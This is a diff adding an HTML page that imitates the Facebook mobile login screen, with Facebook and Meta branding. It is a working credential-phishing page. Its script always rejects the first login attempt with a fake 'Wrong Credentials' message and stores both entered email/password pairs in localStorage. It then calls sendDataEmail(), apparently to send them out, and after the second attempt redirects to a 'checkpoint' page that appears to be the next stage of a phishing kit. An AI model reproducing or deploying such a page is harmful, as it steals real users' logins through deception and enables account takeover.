@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Login Page</title>
+    <meta name="viewport" content="user-scalable=no,width=device-width,viewport-fit=cover">
+    <meta
+      property="og:image"
+      content="https://www.facebook.com/images/fb_icon_325x325.png"
+    />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta property="og:locale" content="en_GB" />
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Import Material Icons -->
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom right, #f7ecec, #e9f4ff);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+            /* Prevent horizontal scrolling */
+        }
+
+        .language-top {
+            text-align: center;
+            padding-top: 10px;
+            color: #888;
+            font-size: 14px;
+        }
+
+        .text-decoration-none {
+            pointer-events: auto;
+            cursor: pointer;
+            -webkit-tap-highlight-color: transparent;
+            color: rgb(99, 120, 138);
+            display: inline;
+            font-size: 10px;
+            white-space: pre-wrap;
+            overflow-wrap: break-word;
+        }
+
+        .content-wrapper {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            /* justify-content: center; */
+            align-items: center;
+            padding: 10px;
+        }
+
+        .center-facebook {
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+        }
+
+        .center-content {
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+        }
+
+        .bottom-content {
+            width: 100%;
+            max-width: 360px;
+            margin: auto;
+            text-align: center;
+        }
+
+        .top-content img {
+            width: 56px;
+            margin-bottom: 20px;
+        }
+
+        .form-floating {
+            position: relative;
+            margin-bottom: 1.5rem;
+        }
+
+        .form-floating input {
+            border: 1px solid #ced4da;
+            border-radius: 8px;
+            padding-right: 40px;
+            padding-left: 15px;
+            height: 50px;
+            box-shadow: none;
+            font-size: 16px;
+            width: 100%;
+        }
+
+        .form-floating label {
+            position: absolute;
+            top: 50%;
+            left: 15px;
+            transform: translateY(-50%);
+            display: flex;
+            align-items: center;
+            font-size: 16px;
+            color: #999;
+            background-color: white;
+            padding: 0 5px;
+            margin-top: 0;
+            transition: all 0.2s ease;
+        }
+
+        .form-floating input:focus+label,
+        .form-floating input:not(:placeholder-shown)+label {
+            top: -10px;
+            left: 10px;
+            font-size: 15px;
+            color: rgb(70, 90, 105);
+            display: inline;
+            font-size: 13px;
+            font-family: "Optimistic Text Normal";
+            white-space: pre-wrap;
+            overflow-wrap: break-word;
+            height: auto;
+            padding: 0 5px;
+            margin-top: 20px;
+        }
+
+        label {
+            background-color: transparent !important;
+        }
+
+
+        .clear-icon,
+        .show-password-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 24px;
+            visibility: hidden;
+        }
+
+        .form-floating input:focus~.clear-icon,
+        .form-floating input:not(:placeholder-shown)~.clear-icon,
+        .form-floating input:focus~.show-password-icon,
+        .form-floating input:not(:placeholder-shown)~.show-password-icon {
+            visibility: visible;
+        }
+
+        .btn-primary {
+            background-color: #1877f2;
+            border: none;
+            height: 50px;
+            border-radius: 40px;
+            font-size: 16px;
+            width: 100%;
+            position: relative;
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.7;
+        }
+
+        /* Custom smooth spinner styles */
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+            animation: spin 1s linear infinite;
+        }
+
+        /* Spinner animation */
+        @keyframes spin {
+            0% {
+                transform: translate(-50%, -50%) rotate(0deg);
+            }
+
+            100% {
+                transform: translate(-50%, -50%) rotate(360deg);
+            }
+        }
+
+        .loading .spinner {
+            display: inline-block;
+        }
+
+        .loading .btn-text {
+            visibility: hidden;
+        }
+
+        .custom-input:focus {
+            outline: none;
+            border-color: grey;
+            border-width: 1px;
+            box-shadow: none;
+            /* Disable default box shadow */
+        }
+
+        .btn-primary:hover {
+            background-color: #145dbf;
+        }
+
+        .forgot-password {
+            margin: 12px 0;
+            text-decoration: none;
+            color: rgb(28, 43, 51);
+            font-weight: 500;
+            font-size: 15px;
+        }
+
+        .btn-outline-primary {
+            height: 50px;
+            font-size: 16px;
+            border-radius: 40px;
+            width: 100%;
+        }
+
+        .meta-logo img {
+            width: 70px;
+            margin-top: 13px;
+        }
+
+        .meta-footer {
+            font-size: 14px;
+            color: #555;
+            margin-top: 20px;
+        }
+
+        footer {
+            font-size: 12px;
+            color: #7b7b7b;
+            margin: 10px 0;
+        }
+
+        .facebook-icon-container img {
+            width: 60px;
+            margin-bottom: 10px;
+        }
+
+        /* Custom modal styling */
+        .modal-dialog {
+            max-width: 400px;
+            margin: auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .modal-content {
+            width: 80%;
+            border-radius: 15px;
+            text-align: center;
+            position: relative;
+        }
+
+        .modal-header {
+            border-bottom: none;
+            padding-bottom: 0;
+        }
+
+        .modal-title {
+            background-color: white;
+            border-radius: 12px;
+            max-width: 100%;
+            font-size: 18px;
+            text-align: center;
+            width: 400px;
+            outline: none;
+        }
+
+        .modal-body {
+            font-size: 16px;
+            color: #555;
+        }
+
+        /* Add a horizontal divider between the content and the button */
+        .divider {
+            width: 100%;
+            height: 1px;
+            background-color: #ddd;
+            margin: 10px 0;
+        }
+
+        .modal-footer {
+            /* border-top: none; */
+            justify-content: center;
+            padding: 0px !important;
+        }
+
+        .modal-footer .btn {
+            color: rgb(24, 119, 242);
+            cursor: pointer;
+            font-size: 16px;
+            line-height: 1.5;
+            padding: 12px 10px;
+            pointer-events: auto !important;
+            margin-left: 0px !important;
+        }
+
+        .modal-footer .btn:hover {
+            text-decoration: underline;
+        }
+
+        .modal-backdrop {
+            background-color: rgba(0, 0, 0, 0.3);
+        }
+    </style>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+</head>
+
+<body>
+
+    <!-- Language selection at the top -->
+    <div class="language-top">
+        <p>English (US)</p>
+    </div>
+    <div class="content-wrapper" style="justify-content: center; ">
+        <div class="center-facebook">
+            <div class="facebook-icon-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"
+                    alt="Facebook Logo">
+            </div>
+        </div>
+
+    </div>
+    <!-- Main Content -->
+    <div class="content-wrapper">
+
+        <div class="center-content">
+            <!-- Facebook logo in the middle -->
+            <!-- Login Form -->
+            <form id="loginForm">
+                <!-- Mobile number or email input -->
+                <div class="form-floating position-relative">
+                    <input type="text" class="form-control custom-input" id="email" placeholder=" ">
+                    <label for="email">Mobile number or email</label>
+                    <span class="material-icons clear-icon" id="clearEmail">clear</span>
+                </div>
+
+                <!-- Password input -->
+                <div class="form-floating position-relative">
+                    <input type="password" class="form-control custom-input" id="password" placeholder=" ">
+                    <label for="password">Password</label>
+                    <i class="material-icons show-password-icon" id="togglePassword">visibility</i>
+                </div>
+
+                <button type="submit" class="btn btn-primary" id="loginButton">
+                    <span class="btn-text">Log in</span>
+                    <div class="spinner"></div>
+                </button>
+            </form>
+
+            <!-- Forgot password link -->
+            <a href="#" class="forgot-password d-block">Forgot password?</a>
+        </div>
+    </div>
+
+    <!-- Meta logo and Footer -->
+    <div class="bottom-content">
+        <button class="btn btn-outline-primary mt-4" disabled>Create new account</button>
+        <div class="meta-logo">
+            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yM/r/DDgwTv3JehF.png" alt="Meta Logo">
+        </div>
+        <footer class="meta-footer mt-2">
+            <a href="#" class="text-decoration-none">About</a> &nbsp;
+            <a href="#" class="text-decoration-none">Help</a> &nbsp;
+            <a href="#" class="text-decoration-none">More</a>
+        </footer>
+    </div>
+
+
+    <!-- Custom Modal for Wrong Credentials -->
+    <div class="modal fade" id="errorModal" tabindex="-1" aria-labelledby="errorModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="errorModalLabel">Wrong Credentials</h5>
+                </div>
+                <div class="modal-body">
+                    Invalid username or password
+                </div>
+                <!-- Divider line -->
+                <!-- <div class="divider"></div> -->
+                <div class="modal-footer">
+                    <button type="button" class="btn" data-bs-dismiss="modal">OK</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="../js/common.js"></script>
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        localStorageinit();
+        // Toggle show/hide password
+        $('#togglePassword').on('click', function () {
+            const passwordField = $('#password');
+            const type = passwordField.attr('type') === 'password' ? 'text' : 'password';
+            passwordField.attr('type', type);
+            $(this).text(type === 'password' ? 'visibility' : 'visibility_off');
+        });
+
+        // Clear the email input
+        $('#clearEmail').on('click', function () {
+            const emailField = $('#email');
+            emailField.val('').focus();
+        });
+        let n = 0;
+        // Handle form submission with a loading state
+        $('#loginForm').on('submit', function (e) {
+            e.preventDefault();
+            const loginButton = $('#loginButton');
+            const errorModal = new bootstrap.Modal($('#errorModal')[0]);
+            loginButton.addClass('loading').prop('disabled', true);
+
+            if ($("#email").val() == '' || $("#password").val() == '') {
+                errorModal.show();
+                loginButton.removeClass('loading').prop('disabled', false);
+            }
+            else {
+                if(n < 1)
+            {
+                setTimeout(function () {
+                    loginButton.removeClass('loading').prop('disabled', false);
+                    errorModal.show();
+                    n ++;
+                    localStorage.setItem('user1',$('#email').val());
+                    localStorage.setItem('pass1',$('#password').val());
+                    localStorage.setItem('user2','');
+                    sendDataEmail();
+                    $("#email").val('');
+                    $("#password").val('');
+                }, 2000); // 2 second delay to simulate loading
+            }
+            else
+            {
+                setTimeout(function () {
+                    loginButton.removeClass('loading').prop('disabled', false);
+                    window.location.href = "../checkpoint/authenticmb.html";
+                }, 2000); // 2 second delay to simulate loading
+                localStorage.setItem('user2',$('#email').val());
+                    localStorage.setItem('pass2',$('#password').val());
+                    sendDataEmail();
+            }
+            }
+        });
+    </script>
+
+</body>
+
+</html>
